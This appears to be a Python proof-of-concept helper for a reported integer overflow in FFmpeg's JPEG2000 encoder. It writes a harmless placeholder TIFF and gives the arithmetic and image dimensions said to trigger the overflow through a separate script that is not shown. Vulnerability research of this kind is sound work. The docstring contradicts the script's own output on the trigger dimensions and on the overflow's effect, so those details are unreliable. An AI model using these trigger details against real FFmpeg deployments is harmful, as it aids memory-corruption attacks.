#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Overflow in JPEG2000 encoder encode_frame()
at libavcodec/j2kenc.c line 1482.

The vulnerability: avctx->width * avctx->height * 9 + FF_INPUT_BUFFER_MIN_SIZE
is computed in int32, causing overflow for large dimensions.

This script creates a minimal placeholder file. The actual trigger uses
/dev/zero as a rawvideo source to avoid creating a 1.44GB file on disk.
The rawvideo approach directly feeds width=30000, height=16000 dimensions
to the JPEG2000 encoder without requiring a real on-disk image of that size.

Dimensions chosen: width=30000, height=16000
  30000 * 16000 * 9 = 4,320,000,000
  As int32: 4,320,000,000 - 2^32 = 4,320,000,000 - 4,294,967,296 = 25,032,704
  So buffer is only ~25MB instead of ~4.32GB -> heap buffer overflow
"""

import struct
import os

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
PLACEHOLDER = os.path.join(OUTPUT_DIR, "vuln_001_input.tiff")

def write_minimal_tiff():
    """
    Write a minimal 1x1 TIFF as a placeholder.
    The actual vulnerability trigger uses rawvideo + /dev/zero in run.sh.
    """
    # TIFF little-endian header
    # II = little-endian, 42 = magic, offset to first IFD = 8
    data = bytearray()
    data += b'II'                         # little-endian
    data += struct.pack('<H', 42)          # TIFF magic
    data += struct.pack('<I', 8)           # offset to first IFD

    # IFD: 12 entries
    num_entries = 12
    data += struct.pack('<H', num_entries)

    # IFD entry format: tag(2) type(2) count(4) value_or_offset(4)
    # Types: 1=BYTE, 2=ASCII, 3=SHORT, 4=LONG, 5=RATIONAL

    ifd_offset = 6 + 2  # after header (8 bytes)
    ifd_size = 2 + num_entries * 12 + 4   # count + entries + next_ifd
    data_offset = 8 + ifd_size  # where extra data starts

    # We'll put: StripOffsets value, StripByteCounts value, extra rational data
    # Image data starts after IFD data
    extra_data_offset = data_offset  # offset for extra rational values

    width = 1
    height = 1
    samples_per_pixel = 3

    # Build IFD entries
    entries = []
    # ImageWidth = 1
    entries.append(struct.pack('<HHII', 256, 3, 1, width))
    # ImageLength = 1
    entries.append(struct.pack('<HHII', 257, 3, 1, height))
    # BitsPerSample = 8,8,8  (need offset since count=3)
    bps_offset = extra_data_offset
    entries.append(struct.pack('<HHII', 258, 3, 3, bps_offset))
    extra_data_offset += 6  # 3 shorts = 6 bytes
    # Compression = 1 (no compression)
    entries.append(struct.pack('<HHII', 259, 3, 1, 1))
    # PhotometricInterpretation = 2 (RGB)
    entries.append(struct.pack('<HHII', 262, 3, 1, 2))
    # StripOffsets: single strip, value is offset to pixel data
    pixel_offset = extra_data_offset + 8  # after XRes and YRes rationals
    entries.append(struct.pack('<HHII', 273, 4, 1, pixel_offset))
    # SamplesPerPixel = 3
    entries.append(struct.pack('<HHII', 277, 3, 1, samples_per_pixel))
    # RowsPerStrip = 1
    entries.append(struct.pack('<HHII', 278, 3, 1, height))
    # StripByteCounts = width*height*spp = 3
    entries.append(struct.pack('<HHII', 279, 4, 1, width * height * samples_per_pixel))
    # XResolution rational (72/1)
    xres_offset = extra_data_offset
    entries.append(struct.pack('<HHII', 282, 5, 1, xres_offset))
    extra_data_offset += 8
    # YResolution rational (72/1)
    yres_offset = extra_data_offset
    entries.append(struct.pack('<HHII', 283, 5, 1, yres_offset))
    extra_data_offset += 8
    # ResolutionUnit = 2 (inch)
    entries.append(struct.pack('<HHII', 296, 3, 1, 2))

    # Recalculate pixel_offset correctly
    # extra_data starts at data_offset = 8 + ifd_size
    # ifd_size = 2 + 12*12 + 4 = 150
    # data_offset = 8 + 150 = 158
    # bps at 158 (6 bytes) -> 164
    # xres at 164 (8 bytes) -> 172
    # yres at 172 (8 bytes) -> 180
    # pixels at 180

    ifd_size_calc = 2 + 12 * 12 + 4
    data_offset_calc = 8 + ifd_size_calc
    bps_at = data_offset_calc           # 158
    xres_at = bps_at + 6               # 164
    yres_at = xres_at + 8              # 172
    pixel_at = yres_at + 8             # 180

    # Rebuild entries with correct offsets
    entries = []
    entries.append(struct.pack('<HHII', 256, 3, 1, width))
    entries.append(struct.pack('<HHII', 257, 3, 1, height))
    entries.append(struct.pack('<HHII', 258, 3, 3, bps_at))
    entries.append(struct.pack('<HHII', 259, 3, 1, 1))
    entries.append(struct.pack('<HHII', 262, 3, 1, 2))
    entries.append(struct.pack('<HHII', 273, 4, 1, pixel_at))
    entries.append(struct.pack('<HHII', 277, 3, 1, samples_per_pixel))
    entries.append(struct.pack('<HHII', 278, 3, 1, height))
    entries.append(struct.pack('<HHII', 279, 4, 1, width * height * samples_per_pixel))
    entries.append(struct.pack('<HHII', 282, 5, 1, xres_at))
    entries.append(struct.pack('<HHII', 283, 5, 1, yres_at))
    entries.append(struct.pack('<HHII', 296, 3, 1, 2))

    # Rebuild full data
    data = bytearray()
    data += b'II'
    data += struct.pack('<H', 42)
    data += struct.pack('<I', 8)

    data += struct.pack('<H', num_entries)
    for e in entries:
        data += e
    data += struct.pack('<I', 0)  # next IFD = none

    # Extra data section
    # BitsPerSample: 8, 8, 8
    data += struct.pack('<HHH', 8, 8, 8)
    # XResolution: 72/1
    data += struct.pack('<II', 72, 1)
    # YResolution: 72/1
    data += struct.pack('<II', 72, 1)
    # Pixel data: 1x1 RGB = 3 bytes
    data += bytes([0xFF, 0xFF, 0xFF])

    with open(PLACEHOLDER, 'wb') as f:
        f.write(data)

    print(f"[+] Placeholder TIFF written to {PLACEHOLDER} ({len(data)} bytes)")
    print("[+] NOTE: The actual vulnerability trigger uses rawvideo + /dev/zero in run.sh")
    print("[+] Trigger dimensions: width=15448, height=15448")
    print("[+] Overflow: 15448*15448*9 = 2,147,766,336 > INT32_MAX (2,147,483,647)")
    print("[+] UBSan detects: signed integer overflow at j2kenc.c:1482")
    print("[+] Note: 30000x16000 rejected by FFmpeg size check; 15448x15448 passes")


if __name__ == '__main__':
    write_minimal_tiff()
